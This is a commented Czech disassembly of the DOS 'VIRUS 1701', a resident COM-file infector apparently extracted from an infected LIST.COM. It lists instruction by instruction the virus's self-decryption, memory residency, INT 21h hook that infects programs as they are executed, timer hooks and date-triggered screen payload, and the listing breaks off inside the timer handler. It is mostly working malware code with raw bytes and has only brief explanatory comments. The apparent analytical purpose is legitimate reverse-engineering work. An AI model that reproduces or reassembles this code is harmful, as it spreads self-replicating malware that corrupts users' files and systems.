; VIRUS 1701
; Rezidentni virus napadajici soubory typu COM.
;----------------------------------------------------------
; Virus byl vypreparovan ze souboru LIST.COM
; Nakaza  JARO 1989


3478:0100 E9E00F         JMP    10E3
;==========================================================
3478:10E3 FA             CLI
3478:10E4 8BEC           MOV    BP,SP
3478:10E6 E80000         CALL   10E9
;----------------------------------------------------------
3478:10E9 5B             POP    BX
3478:10EA 81EB3101       SUB    BX,0131
3478:10EE 2EF6872A0101   TEST   Byte Ptr CS:[BX+012A],01  ; Je potrebne VIRUS
3478:10F4 740F           JZ     1105                      ; dekodovat.
3478:10F6 8DB74D01       LEA    SI,[BX+014D]    ;----------------------------
3478:10FA BC8206         MOV    SP,0682         ; Dekodovani VIRU.
3478:10FD 3134           XOR    [SI],SI         ;
3478:10FF 3124           XOR    [SI],SP         ;
3478:1101 46             INC    SI              ;
3478:1102 4C             DEC    SP              ;
3478:1103 75F8           JNZ    10FD            ;----------------------------
3478:1105 8BE5           MOV    SP,BP
3478:1107 EB4F           JMP    1158
;==========================================================
3478:1100  24 46 4C 75 F8 8B E5 EB-4F 90 00 01 32 30 00 00  $FLux.ekO...20..
3478:1110  BC 34 13 00 00 53 FF 00-F0 72 0E F8 14 45 14 26  <4...S..pr.x.E.&
3478:1120  02 00 00 20 00 AA 12 9F-9E 7B 3D 6E 9B E2 0F 00  ... .*...{=n.b..
3478:1130  00 E9 83 13 00 00 00 00-00 08 00 00 00 00 22 01  .i............".
3478:1140  31 06 31 06 00 00 01 00-07 1E 15 00 00 00 00 00  1.1.............
3478:1150  00 01 00 00 14 14 14 14-E8 00 00 5B 81 EB A3 01  ........h..[.k#.
;==========================================================
3478:1158 E80000         CALL   115B
;----------------------------------------------------------
3478:115B 5B             POP    BX
3478:115C 81EBA301       SUB    BX,01A3
3478:1160 2E8C8F5401     MOV    CS:[BX+0154],CS      ; 110C
3478:1165 2E89875601     MOV    CS:[BX+0156],AX      ; 110E
3478:116A 2E8B875801     MOV    AX,CS:[BX+0158]  ; Obnoveni prvnich tri
3478:116F A30001         MOV    [0100],AX        ; instrukci.
3478:1172 2E8A875A01     MOV    AL,CS:[BX+015A]  ;
3478:1177 A20201         MOV    [0102],AL     ;------------------------------
3478:117A 53             PUSH   BX            ;
3478:117B B430           MOV    AH,30         ; Verze operacniho systemu.
3478:117D CD21           INT    21            ;
3478:117F 5B             POP    BX            ;
3478:1180 3C02           CMP    AL,02         ;
3478:1182 7211           JB     1195          ;------------------------------
3478:1184 B8FF4B         MOV    AX,4BFF       ; Test pritomnosti v pameti.
3478:1187 33FF           XOR    DI,DI         ;
3478:1189 33F6           XOR    SI,SI         ;
3478:118B CD21           INT    21            ;
3478:118D 81FFAA55       CMP    DI,55AA       ;
3478:1191 750F           JNZ    11A2
3478:1193 7216           JB     11AB
3478:1195 FB             STI                     ; VIRUS pritomen, KONEC.
3478:1196 1E             PUSH   DS               ;
3478:1197 07             POP    ES               ;
3478:1198 2E8B875601     MOV    AX,CS:[BX+0156]  ;
3478:119D 2EFFAF5201     JMP    FAR CS:[BX+0152] ;---------------------------
3478:11A2 53             PUSH   BX               ; Nacti intr.vect 21H.
3478:11A3 B82135         MOV    AX,3521          ;
3478:11A6 CD21           INT    21               ;
3478:11A8 8BC3           MOV    AX,BX            ;
3478:11AA 5B             POP    BX               ;
3478:11AB 2E89876101     MOV    CS:[BX+0161],AX  ;
3478:11B0 2E8C876301     MOV    CS:[BX+0163],ES  ;---------------------------
3478:11B5 B800F0         MOV    AX,F000                ; BLBOST nebo blafak.
3478:11B8 8EC0           MOV    ES,AX                  ;
3478:11BA BF08E0         MOV    DI,E008                ;
3478:11BD 813D434F       CMP    Word Ptr [DI],4F43     ;
3478:11C1 751B           JNZ    11DE                   ;
3478:11C3 817D025052     CMP    Word Ptr [DI+02],5250  ;
3478:11C8 7514           JNZ    11DE                   ;
3478:11CA 817D042E20     CMP    Word Ptr [DI+04],202E  ;
3478:11CF 750D           JNZ    11DE                   ;
3478:11D1 817D064942     CMP    Word Ptr [DI+06],4249  ;
3478:11D6 7506           JNZ    11DE                   ;
3478:11D8 837D084D       CMP    Word Ptr [DI+08],+4D   ;
3478:11DC 74B7           JZ     1195                   ;---------------------
3478:11DE B87B00         MOV    AX,007B                ; Delka VIRU v parag.
3478:11E1 8CCD           MOV    BP,CS                  ; Manipulace s pamet.
3478:11E3 4D             DEC    BP                     ; blokem.
3478:11E4 8EC5           MOV    ES,BP                  ;
3478:11E6 2E8B361600     MOV    SI,CS:[0016]           ; Zmena vlastnika.
3478:11EB 2689360100     MOV    ES:[0001],SI           ;
3478:11F0 268B160300     MOV    DX,ES:[0003]           ;
3478:11F5 26A30300       MOV    ES:[0003],AX           ; Delka.
3478:11F9 26C60600004D   MOV    Byte Ptr ES:[0000],'M' ;
3478:11FF 2BD0           SUB    DX,AX                  ;
3478:1201 4A             DEC    DX                     ;
3478:1202 45             INC    BP                     ;
3478:1203 03E8           ADD    BP,AX                  ;
3478:1205 45             INC    BP                     ;
3478:1206 8EC5           MOV    ES,BP                  ;
3478:1208 53             PUSH   BX                     ;
3478:1209 B450           MOV    AH,50      ; Nastav adresu PSP.
3478:120B 8BDD           MOV    BX,BP      ;
3478:120D CD21           INT    21         ;---------------------------------
3478:120F 5B             POP    BX
3478:1210 33FF           XOR    DI,DI
3478:1212 06             PUSH   ES
3478:1213 17             POP    SS
3478:1214 57             PUSH   DI
3478:1215 8DBFCE07       LEA    DI,[BX+07CE]  ; Prenes program.
3478:1219 8BF7           MOV    SI,DI         ;
3478:121B B9A506         MOV    CX,06A5       ;
3478:121E FD             STD                  ;
3478:121F F3             REPZ                 ;
3478:1220 A4             MOVSB                ;------------------------------
3478:1221 06             PUSH   ES
3478:1222 8D8F7002       LEA    CX,[BX+0270]
3478:1226 51             PUSH   CX
3478:1227 CB             RETF                    ; Pokracovani 34F4:1228

;==========================================================
AX=507B  BX=0FB8  CX=1228  DX=4B0C  SP=FFFC  BP=34F4  SI=10E1  DI=10E1
DS=3478  ES=34F4  SS=34F4  CS=34F4  IP=1228   NV DN EI PL ZR NA PE NC

34F4:1228 2E8C8F5401     MOV    CS:[BX+0154],CS  ; CS:110C=3478
34F4:122D 8D8F2A01       LEA    CX,[BX+012A]
34F4:1231 F3             REPZ                    ; Prenes VIRUS do vytvor.
34F4:1232 A4             MOVSB                   ; pam. bloku.
34F4:1233 2E8C0E3600     MOV    CS:[0036],CS
34F4:1238 4D             DEC    BP
34F4:1239 8EC5           MOV    ES,BP
34F4:123B 2689160300     MOV    ES:[0003],DX
34F4:1240 26C60600005A   MOV    Byte Ptr ES:[0000],5A         ;'Z'
34F4:1246 268C0E0100     MOV    ES:[0001],CS
34F4:124B 45             INC    BP
34F4:124C 8EC5           MOV    ES,BP
34F4:124E 1E             PUSH   DS
34F4:124F 07             POP    ES
34F4:1250 0E             PUSH   CS
34F4:1251 1F             POP    DS
34F4:1252 8DB72A01       LEA    SI,[BX+012A]
34F4:1256 BF0001         MOV    DI,0100
34F4:1259 B9A506         MOV    CX,06A5
34F4:125C FC             CLD
34F4:125D F3             REPZ
34F4:125E A4             MOVSB
34F4:125F 06             PUSH   ES
34F4:1260 8D068402       LEA    AX,[0284]
34F4:1264 50             PUSH   AX
34F4:1265 CB             RETF                  ; Pokracovani na 3478:284

;==========================================================
3478:0000  CD 20 00 80 00 9A F0 FE-1D F0 8E 09 75 2B 2B 0A  M ....p~.p..u++.
3478:0010  75 2B 56 09 75 2B 65 2B-01 01 01 00 02 FF FF FF  u+V.u+e+........
3478:0020  FF FF FF FF FF FF FF FF-FF FF FF FF 70 34 E4 FF  ............p4d.
3478:0030  78 34 14 00 18 00 78 34-FF FF FF FF 00 00 00 00  x4....x4........
3478:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
3478:0050  CD 21 CB 00 00 00 00 00-00 00 00 00 00 20 20 20  M!K..........
3478:0060  20 20 20 20 20 20 20 20-00 00 00 00 00 20 20 20          .....
3478:0070  20 20 20 20 20 20 20 20-00 00 00 00 00 00 00 00          ........
3478:0080  00 0D 4C 49 53 54 2E 43-4F 4D 00 2E 64 69 72 00  ..LIST.COM..dir.
3478:0090  0D 0D 0D 49 43 3B 43 3A-5C 44 42 41 53 45 3B 43  ...IC;C:\DBASE;C
3478:00A0  3A 5C 54 43 3B 43 3A 5C-54 41 53 4D 3B 43 3A 5C  :\TC;C:\TASM;C:\
3478:00B0  75 74 69 6C 3B 0D 53 4B-45 54 4F 56 45 4A 20 4A  util;.SKETOVEJ J
3478:00C0  45 44 4E 4F 54 4B 59 20-21 21 21 0D 00 00 00 00  EDNOTKY !!!.....
3478:00D0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
3478:00E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
3478:00F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
3478:0100  01 FA 8B EC E8 00 00 5B-81 EB 31 01 2E F6 87 2A  .z.lh..[.k1..v.*
3478:0110  01 01 74 0F 8D B7 4D 01-BC 82 06 31 34 31 24 46  ..t..7M.<..141$F
3478:0120  4C 75 F8 8B E5 EB 4F 90-00 01 F4 34 00 00 BC 34  Lux.ekO...t4..<4
3478:0130  13 00 00 53 FF 00 F0 72-0E AD 10 45 14 26 02 00  ...S..pr.-.E.&..
3478:0140  00 20 00 AA 12 9F 9E 7B-3D 6E 9B E2 0F 00 00 E9  . .*...{=n.b...i
3478:0150  83 13 00 00 00 00 00 08-00 00 00 00 22 01 31 06  ............".1.
3478:0160  31 06 00 00 01 00 07 1E-15 00 00 00 00 00 00 01  1...............
3478:0170  00 00 14 14 14 14 E8 00-00 5B 81 EB A3 01 2E 8C  ......h..[.k#...
3478:0180  8F 54 01 2E 89 87 56 01-2E 8B 87 58 01 A3 00 01  .T....V....X.#..
3478:0190  2E 8A 87 5A 01 A2 02 01-53 B4 30 CD 21 5B 3C 02  ...Z."..S40M![<.
3478:01A0  72 11 B8 FF 4B 33 FF 33-F6 CD 21 81 FF AA 55 75  r.8.K3.3vM!..*Uu
3478:01B0  0F 72 16                                         .r.

3478:01B3 FB             STI
3478:01B4 1E             PUSH   DS
3478:01B5 07             POP    ES
3478:01B6 2E8B875601     MOV    AX,CS:[BX+0156]
3478:01BB 2EFFAF5201     JMP    FAR CS:[BX+0152]

;==========================================================
; Pokracovani po 34F4:1265
;
AX=0284  BX=0FB8  CX=0000  DX=4B0C  SP=FFFC  BP=34F4  SI=1787  DI=07A5
DS=34F4  ES=3478  SS=34F4  CS=3478  IP=0284   NV UP EI PL NZ NA PO NC

3478:0284 2EC7062C000000 MOV    Word Ptr CS:[002C],0    ; CS:002C=3470
3478:028B 2E8C0E1600     MOV    CS:[0016],CS
3478:0290 1E             PUSH   DS
3478:0291 8D161C03       LEA    DX,[031C]   ; Nova obsluha preruseni 21H.
3478:0295 0E             PUSH   CS          ;
3478:0296 1F             POP    DS          ;
3478:0297 B82125         MOV    AX,2521     ;
3478:029A CD21           INT    21          ;--------------------------------
3478:029C 1F             POP    DS
3478:029D B41A           MOV    AH,1A
3478:029F BA8000         MOV    DX,0080
3478:02A2 CD21           INT    21
3478:02A4 E8F301         CALL   049A
3478:02A7 B42A           MOV    AH,2A
3478:02A9 CD21           INT    21
3478:02AB 81F9C407       CMP    CX,07C4
3478:02AF 7765           JA     0316
3478:02B1 742A           JZ     02DD
3478:02B3 81F9BC07       CMP    CX,07BC
3478:02B7 755D           JNZ    0316
3478:02B9 1E             PUSH   DS
3478:02BA B82835         MOV    AX,3528       ; Cti intr. vect preruseni 28H.
3478:02BD CD21           INT    21            ;
3478:02BF 2E891E3B01     MOV    CS:[013B],BX  ;
3478:02C4 2E8C063D01     MOV    CS:[013D],ES  ;------------------------------
3478:02C9 B82825         MOV    AX,2528       ; A hned ho i nastav.
3478:02CC BA2207         MOV    DX,0722       ;
3478:02CF 0E             PUSH   CS            ;
3478:02D0 1F             POP    DS            ;
3478:02D1 CD21           INT    21            ;------------------------------
3478:02D3 1F             POP    DS
3478:02D4 2E800E570108   OR     Byte Ptr CS:[0157],08
3478:02DA EB06           JMP    02E2
3478:02DC 90             NOP
3478:02DD 80FE0A         CMP    DH,0A
3478:02E0 7234           JB     0316
3478:02E2 E87D02         CALL   0562
3478:02E5 B81815         MOV    AX,1518
3478:02E8 E88401         CALL   046F
3478:02EB 40             INC    AX
3478:02EC 2EA35E01       MOV    CS:[015E],AX
3478:02F0 2EA36001       MOV    CS:[0160],AX
3478:02F4 2EC70664010100 MOV    Word Ptr CS:[0164],0001
3478:02FB B81C35         MOV    AX,351C
3478:02FE CD21           INT    21
3478:0300 2E891E3301     MOV    CS:[0133],BX
3478:0305 2E8C063501     MOV    CS:[0135],ES
3478:030A 1E             PUSH   DS
3478:030B B81C25         MOV    AX,251C
3478:030E BABD06         MOV    DX,06BD
3478:0311 0E             PUSH   CS
3478:0312 1F             POP    DS
3478:0313 CD21           INT    21
3478:0315 1F             POP    DS
3478:0316 BBD6FF         MOV    BX,FFD6
3478:0319 E997FE         JMP    01B3


;==========================================================
; Obsluha preruseni 21H.

3478:031C 80FC4B         CMP    AH,4B
3478:031F 7410           JZ     0331
3478:0321 2EFF2E3701     JMP    FAR CS:[0137]     ;---------------------------
3478:0326 BFAA55         MOV    DI,55AA           ; Test pritomnosti v pameti.
3478:0329 2EC4063701     LES    AX,CS:[0137]
3478:032E 8CCA           MOV    DX,CS
3478:0330 CF             IRET
3478:0331 3CFF           CMP    AL,FF
3478:0333 74F1           JZ     0326
3478:0335 3C00           CMP    AL,00
3478:0337 75E8           JNZ    0321
3478:0339 9C             PUSHF
3478:033A 50             PUSH   AX
3478:033B 53             PUSH   BX
3478:033C 51             PUSH   CX
3478:033D 52             PUSH   DX
3478:033E 56             PUSH   SI
3478:033F 57             PUSH   DI
3478:0340 55             PUSH   BP
3478:0341 06             PUSH   ES
3478:0342 1E             PUSH   DS
3478:0343 2E89164701     MOV    CS:[0147],DX
3478:0348 2E8C1E4901     MOV    CS:[0149],DS
3478:034D 0E             PUSH   CS
3478:034E 07             POP    ES
3478:034F B8003D         MOV    AX,3D00
3478:0352 CD21           INT    21
3478:0354 7256           JB     03AC
3478:0356 8BD8           MOV    BX,AX
3478:0358 B80057         MOV    AX,5700
3478:035B CD21           INT    21
3478:035D 2E89164301     MOV    CS:[0143],DX
3478:0362 2E890E4501     MOV    CS:[0145],CX
3478:0367 B43F           MOV    AH,3F
3478:0369 0E             PUSH   CS
3478:036A 1F             POP    DS
3478:036B BA2E01         MOV    DX,012E
3478:036E B90300         MOV    CX,0003
3478:0371 CD21           INT    21
3478:0373 7237           JB     03AC
3478:0375 3BC1           CMP    AX,CX
3478:0377 7533           JNZ    03AC
3478:0379 B80242         MOV    AX,4202
3478:037C 33C9           XOR    CX,CX
3478:037E 33D2           XOR    DX,DX
3478:0380 CD21           INT    21
3478:0382 2EA34B01       MOV    CS:[014B],AX
3478:0386 2E89164D01     MOV    CS:[014D],DX
3478:038B B43E           MOV    AH,3E
3478:038D CD21           INT    21
3478:038F 2E813E2E014D5A CMP    Word Ptr CS:[012E],5A4D
3478:0396 7503           JNZ    039B
3478:0398 E9C700         JMP    0462
3478:039B 2E833E4D0100   CMP    Word Ptr CS:[014D],+00
3478:03A1 7709           JA     03AC
3478:03A3 2E813E4B013BF9 CMP    Word Ptr CS:[014B],F93B
3478:03AA 7603           JBE    03AF
3478:03AC E9B300         JMP    0462
3478:03AF 2E803E2E01E9   CMP    Byte Ptr CS:[012E],E9
3478:03B5 750E           JNZ    03C5
3478:03B7 2EA14B01       MOV    AX,CS:[014B]
3478:03BB 0559F9         ADD    AX,F959
3478:03BE 2E3B062F01     CMP    AX,CS:[012F]
3478:03C3 74E7           JZ     03AC
3478:03C5 B80043         MOV    AX,4300
3478:03C8 2EC5164701     LDS    DX,CS:[0147]
3478:03CD CD21           INT    21
3478:03CF 72DB           JB     03AC
3478:03D1 2E890E4101     MOV    CS:[0141],CX
3478:03D6 80F120         XOR    CL,20
3478:03D9 F6C127         TEST   CL,27
3478:03DC 7409           JZ     03E7
3478:03DE B80143         MOV    AX,4301
3478:03E1 33C9           XOR    CX,CX
3478:03E3 CD21           INT    21
3478:03E5 72C5           JB     03AC
3478:03E7 B8023D         MOV    AX,3D02
3478:03EA CD21           INT    21
3478:03EC 72BE           JB     03AC
3478:03EE 8BD8           MOV    BX,AX
3478:03F0 B80242         MOV    AX,4202
3478:03F3 33C9           XOR    CX,CX
3478:03F5 33D2           XOR    DX,DX
3478:03F7 CD21           INT    21
3478:03F9 E85003         CALL   074C
3478:03FC 7318           JNB    0416
3478:03FE B80042         MOV    AX,4200
3478:0401 2E8B0E4D01     MOV    CX,CS:[014D]
3478:0406 2E8B164B01     MOV    DX,CS:[014B]
3478:040B CD21           INT    21
3478:040D B440           MOV    AH,40
3478:040F 33C9           XOR    CX,CX
3478:0411 CD21           INT    21
3478:0413 EB21           JMP    0436
3478:0415 90             NOP
3478:0416 B80042         MOV    AX,4200
3478:0419 33C9           XOR    CX,CX
3478:041B 33D2           XOR    DX,DX
3478:041D CD21           INT    21
3478:041F 7215           JB     0436
3478:0421 2EA14B01       MOV    AX,CS:[014B]
3478:0425 05FEFF         ADD    AX,FFFE
3478:0428 2EA35001       MOV    CS:[0150],AX
3478:042C B440           MOV    AH,40
3478:042E BA4F01         MOV    DX,014F
3478:0431 B90300         MOV    CX,0003
3478:0434 CD21           INT    21
3478:0436 B80157         MOV    AX,5701
3478:0439 2E8B164301     MOV    DX,CS:[0143]
3478:043E 2E8B0E4501     MOV    CX,CS:[0145]
3478:0443 CD21           INT    21
3478:0445 B43E           MOV    AH,3E
3478:0447 CD21           INT    21
3478:0449 2E8B0E4101     MOV    CX,CS:[0141]
3478:044E F6C107         TEST   CL,07
3478:0451 7505           JNZ    0458
3478:0453 F6C120         TEST   CL,20
3478:0456 750A           JNZ    0462
3478:0458 B80143         MOV    AX,4301
3478:045B 2EC5164701     LDS    DX,CS:[0147]
3478:0460 CD21           INT    21
3478:0462 1F             POP    DS
3478:0463 07             POP    ES
3478:0464 5D             POP    BP
3478:0465 5F             POP    DI
3478:0466 5E             POP    SI
3478:0467 5A             POP    DX
3478:0468 59             POP    CX
3478:0469 5B             POP    BX
3478:046A 58             POP    AX
3478:046B 9D             POPF
3478:046C E9B2FE         JMP    0321
3478:046F 1E             PUSH   DS
3478:0470 0E             PUSH   CS
3478:0471 1F             POP    DS
3478:0472 53             PUSH   BX
3478:0473 51             PUSH   CX
3478:0474 52             PUSH   DX
3478:0475 50             PUSH   AX
3478:0476 B90700         MOV    CX,0007
3478:0479 BB7401         MOV    BX,0174
3478:047C FF37           PUSH   [BX]
3478:047E 8B47FE         MOV    AX,[BX-02]
3478:0481 1107           ADC    [BX],AX
3478:0483 4B             DEC    BX
3478:0484 4B             DEC    BX
3478:0485 E2F7           LOOP   047E
3478:0487 58             POP    AX
3478:0488 1107           ADC    [BX],AX
3478:048A 8B17           MOV    DX,[BX]
3478:048C 58             POP    AX
3478:048D 0BC0           OR     AX,AX
3478:048F 7402           JZ     0493
3478:0491 F7E2           MUL    DX
3478:0493 8BC2           MOV    AX,DX
3478:0495 5A             POP    DX
3478:0496 59             POP    CX
3478:0497 5B             POP    BX
3478:0498 1F             POP    DS
3478:0499 C3             RET
3478:049A 1E             PUSH   DS
3478:049B 06             PUSH   ES
3478:049C 56             PUSH   SI
3478:049D 57             PUSH   DI
3478:049E 51             PUSH   CX
3478:049F 0E             PUSH   CS
3478:04A0 07             POP    ES
3478:04A1 B94000         MOV    CX,0040
3478:04A4 8ED9           MOV    DS,CX
3478:04A6 BF6601         MOV    DI,0166
3478:04A9 BE6C00         MOV    SI,006C
3478:04AC B90800         MOV    CX,0008
3478:04AF FC             CLD
3478:04B0 F3             REPZ
3478:04B1 A5             MOVSW
3478:04B2 59             POP    CX
3478:04B3 5F             POP    DI
3478:04B4 5E             POP    SI
3478:04B5 07             POP    ES
3478:04B6 1F             POP    DS
3478:04B7 C3             RET
3478:04B8 56             PUSH   SI
3478:04B9 1E             PUSH   DS
3478:04BA 52             PUSH   DX
3478:04BB 8AC6           MOV    AL,DH
3478:04BD F6265201       MUL    Byte Ptr [0152]
3478:04C1 B600           MOV    DH,00
3478:04C3 03C2           ADD    AX,DX
3478:04C5 D1E0           SHL    AX,1
3478:04C7 03065A01       ADD    AX,[015A]
3478:04CB 8BF0           MOV    SI,AX
3478:04CD F6065401FF     TEST   Byte Ptr [0154],FF
3478:04D2 8E1E5801       MOV    DS,[0158]
3478:04D6 7412           JZ     04EA
3478:04D8 BADA03         MOV    DX,03DA
3478:04DB FA             CLI
3478:04DC EC             IN     AL,DX
3478:04DD A808           TEST   AL,08
3478:04DF 7509           JNZ    04EA
3478:04E1 A801           TEST   AL,01
3478:04E3 75F7           JNZ    04DC
3478:04E5 EC             IN     AL,DX
3478:04E6 A801           TEST   AL,01
3478:04E8 74FB           JZ     04E5
3478:04EA AD             LODSW
3478:04EB FB             STI
3478:04EC 5A             POP    DX
3478:04ED 1F             POP    DS
3478:04EE 5E             POP    SI
3478:04EF C3             RET
3478:04F0 57             PUSH   DI
3478:04F1 06             PUSH   ES
3478:04F2 52             PUSH   DX
3478:04F3 53             PUSH   BX
3478:04F4 8BD8           MOV    BX,AX
3478:04F6 8AC6           MOV    AL,DH
3478:04F8 F6265201       MUL    Byte Ptr [0152]
3478:04FC B600           MOV    DH,00
3478:04FE 03C2           ADD    AX,DX
3478:0500 D1E0           SHL    AX,1
3478:0502 03065A01       ADD    AX,[015A]
3478:0506 8BF8           MOV    DI,AX
3478:0508 F6065401FF     TEST   Byte Ptr [0154],FF
3478:050D 8E065801       MOV    ES,[0158]
3478:0511 7412           JZ     0525
3478:0513 BADA03         MOV    DX,03DA
3478:0516 FA             CLI
3478:0517 EC             IN     AL,DX
3478:0518 A808           TEST   AL,08
3478:051A 7509           JNZ    0525
3478:051C A801           TEST   AL,01
3478:051E 75F7           JNZ    0517
3478:0520 EC             IN     AL,DX
3478:0521 A801           TEST   AL,01
3478:0523 74FB           JZ     0520
3478:0525 8BC3           MOV    AX,BX
3478:0527 AA             STOSB
3478:0528 FB             STI
3478:0529 5B             POP    BX
3478:052A 5A             POP    DX
3478:052B 07             POP    ES
3478:052C 5F             POP    DI
3478:052D C3             RET
3478:052E 51             PUSH   CX
3478:052F 51             PUSH   CX
3478:0530 8B0E5C01       MOV    CX,[015C]
3478:0534 E2FE           LOOP   0534
3478:0536 59             POP    CX
3478:0537 E2F6           LOOP   052F
3478:0539 59             POP    CX
3478:053A C3             RET
3478:053B 50             PUSH   AX
3478:053C E461           IN     AL,61
3478:053E 3402           XOR    AL,02
3478:0540 24FE           AND    AL,FE
3478:0542 E661           OUT    61,AL
3478:0544 58             POP    AX
3478:0545 C3             RET
3478:0546 3C00           CMP    AL,00
3478:0548 740A           JZ     0554
3478:054A 3C20           CMP    AL,20
3478:054C 7406           JZ     0554
3478:054E 3CFF           CMP    AL,FF
3478:0550 7402           JZ     0554
3478:0552 F8             CLC
3478:0553 C3             RET
3478:0554 F9             STC
3478:0555 C3             RET
3478:0556 3CB0           CMP    AL,B0
3478:0558 7206           JB     0560
3478:055A 3CDF           CMP    AL,DF
3478:055C 7702           JA     0560
3478:055E F9             STC
3478:055F C3             RET
3478:0560 F8             CLC
3478:0561 C3             RET
3478:0562 1E             PUSH   DS
3478:0563 B84000         MOV    AX,0040
3478:0566 8ED8           MOV    DS,AX
3478:0568 FB             STI
3478:0569 A16C00         MOV    AX,[006C]
3478:056C 3B066C00       CMP    AX,[006C]
3478:0570 74FA           JZ     056C
3478:0572 33C9           XOR    CX,CX
3478:0574 A16C00         MOV    AX,[006C]
3478:0577 41             INC    CX
3478:0578 7415           JZ     058F
3478:057A 3B066C00       CMP    AX,[006C]
3478:057E 74F7           JZ     0577
3478:0580 1F             POP    DS
3478:0581 8BC1           MOV    AX,CX
3478:0583 33D2           XOR    DX,DX
3478:0585 B90F00         MOV    CX,000F
3478:0588 F7F1           DIV    CX
3478:058A 2EA35C01       MOV    CS:[015C],AX
3478:058E C3             RET
3478:058F 49             DEC    CX
3478:0590 EBEE           JMP    0580
3478:0592 C606530118     MOV    Byte Ptr [0153],18
3478:0597 1E             PUSH   DS
3478:0598 B84000         MOV    AX,0040
3478:059B 8ED8           MOV    DS,AX
3478:059D A14E00         MOV    AX,[004E]
3478:05A0 1F             POP    DS
3478:05A1 A35A01         MOV    [015A],AX
3478:05A4 B2FF           MOV    DL,FF
3478:05A6 B83011         MOV    AX,1130
3478:05A9 B700           MOV    BH,00
3478:05AB 06             PUSH   ES
3478:05AC 55             PUSH   BP
3478:05AD CD10           INT    10
3478:05AF 5D             POP    BP
3478:05B0 07             POP    ES
3478:05B1 80FAFF         CMP    DL,FF
3478:05B4 7404           JZ     05BA
3478:05B6 88165301       MOV    [0153],DL
3478:05BA B40F           MOV    AH,0F
3478:05BC CD10           INT    10
3478:05BE 88265201       MOV    [0152],AH
3478:05C2 C606540100     MOV    Byte Ptr [0154],00
3478:05C7 C706580100B0   MOV    Word Ptr [0158],B000
3478:05CD 3C07           CMP    AL,07
3478:05CF 7436           JZ     0607
3478:05D1 7203           JB     05D6
3478:05D3 E9E000         JMP    06B6
3478:05D6 C706580100B8   MOV    Word Ptr [0158],B800
3478:05DC 3C03           CMP    AL,03
3478:05DE 7727           JA     0607
3478:05E0 3C02           CMP    AL,02
3478:05E2 7223           JB     0607
3478:05E4 C606540101     MOV    Byte Ptr [0154],01
3478:05E9 A05301         MOV    AL,[0153]
3478:05EC FEC0           INC    AL
3478:05EE F6265201       MUL    Byte Ptr [0152]
3478:05F2 A36201         MOV    [0162],AX
3478:05F5 A16401         MOV    AX,[0164]
3478:05F8 3B066201       CMP    AX,[0162]
3478:05FC 7603           JBE    0601
3478:05FE A16201         MOV    AX,[0162]
3478:0601 E86BFE         CALL   046F
3478:0604 40             INC    AX
3478:0605 8BF0           MOV    SI,AX
3478:0607 33FF           XOR    DI,DI
3478:0609 47             INC    DI
3478:060A A16201         MOV    AX,[0162]
3478:060D D1E0           SHL    AX,1
3478:060F 3BF8           CMP    DI,AX
3478:0611 7603           JBE    0616
3478:0613 E9A000         JMP    06B6
3478:0616 800E570102     OR     Byte Ptr [0157],02
3478:061B A05201         MOV    AL,[0152]
3478:061E B400           MOV    AH,00
3478:0620 E84CFE         CALL   046F
3478:0623 8AD0           MOV    DL,AL
3478:0625 A05301         MOV    AL,[0153]
3478:0628 B400           MOV    AH,00
3478:062A E842FE         CALL   046F
3478:062D 8AF0           MOV    DH,AL
3478:062F E886FE         CALL   04B8
3478:0632 E811FF         CALL   0546
3478:0635 72D2           JB     0609
3478:0637 E81CFF         CALL   0556
3478:063A 72CD           JB     0609
3478:063C A25501         MOV    [0155],AL
3478:063F 88265601       MOV    [0156],AH
3478:0643 8A0E5301       MOV    CL,[0153]
3478:0647 B500           MOV    CH,00
3478:0649 FEC6           INC    DH
3478:064B 3A365301       CMP    DH,[0153]
3478:064F 7752           JA     06A3
3478:0651 E864FE         CALL   04B8
3478:0654 3A265601       CMP    AH,[0156]
3478:0658 7549           JNZ    06A3
3478:065A E8E9FE         CALL   0546
3478:065D 7228           JB     0687
3478:065F E8F4FE         CALL   0556
3478:0662 723F           JB     06A3
3478:0664 FEC6           INC    DH
3478:0666 3A365301       CMP    DH,[0153]
3478:066A 7737           JA     06A3
3478:066C E849FE         CALL   04B8
3478:066F 3A265601       CMP    AH,[0156]
3478:0673 752E           JNZ    06A3
3478:0675 E8CEFE         CALL   0546
3478:0678 73E5           JNB    065F
3478:067A E8BEFE         CALL   053B
3478:067D FECE           DEC    DH
3478:067F E836FE         CALL   04B8
3478:0682 A25501         MOV    [0155],AL
3478:0685 FEC6           INC    DH
3478:0687 80265701FD     AND    Byte Ptr [0157],FD
3478:068C FECE           DEC    DH
3478:068E B020           MOV    AL,20
3478:0690 E85DFE         CALL   04F0
3478:0693 FEC6           INC    DH
3478:0695 A05501         MOV    AL,[0155]
3478:0698 E855FE         CALL   04F0
3478:069B E304           JCXZ   06A1
3478:069D E88EFE         CALL   052E
3478:06A0 49             DEC    CX
3478:06A1 EBA6           JMP    0649
3478:06A3 F606570102     TEST   Byte Ptr [0157],02
3478:06A8 7403           JZ     06AD
3478:06AA E95CFF         JMP    0609
3478:06AD E88BFE         CALL   053B
3478:06B0 4E             DEC    SI
3478:06B1 7403           JZ     06B6
3478:06B3 E951FF         JMP    0607
3478:06B6 E461           IN     AL,61
3478:06B8 24FC           AND    AL,FC
3478:06BA E661           OUT    61,AL
3478:06BC C3             RET

;==========================================================
; Obsluha preruseni 1CH
;
3478:06BD 2EF606570109   TEST   Byte Ptr CS:[0157],09
3478:06C3 7558           JNZ    071D
3478:06C5 2E800E570101   OR     Byte Ptr CS:[0157],01
3478:06CB 2EFF0E5E01     DEC    Word Ptr CS:[015E]
3478:06D0 7545           JNZ    0717
3478:06D2 1E             PUSH   DS
3478:06D3 06             PUSH   ES
3478:06D4 0E             PUSH   CS
3478:06D5 1F             POP    DS
3478:06D6 0E             PUSH   CS
3478:06D7 07             POP    ES
3478:06D8 50             PUSH   AX
3478:06D9 53             PUSH   BX
3478:06DA 51             PUSH   CX
3478:06DB 52             PUSH   DX
3478:06DC 56             PUSH   SI
3478:06DD 57             PUSH   DI
3478:06DE 55             PUSH   BP
3478:06DF B020           MOV    AL,20
3478:06E1 E620           OUT    20,AL
3478:06E3 A16001         MOV    AX,[0160]
3478:06E6 3D3804         CMP    AX,0438
3478:06E9 7303           JNB    06EE
3478:06EB B83804         MOV    AX,0438
3478:06EE E87EFD         CALL   046F
3478:06F1 40             INC    AX
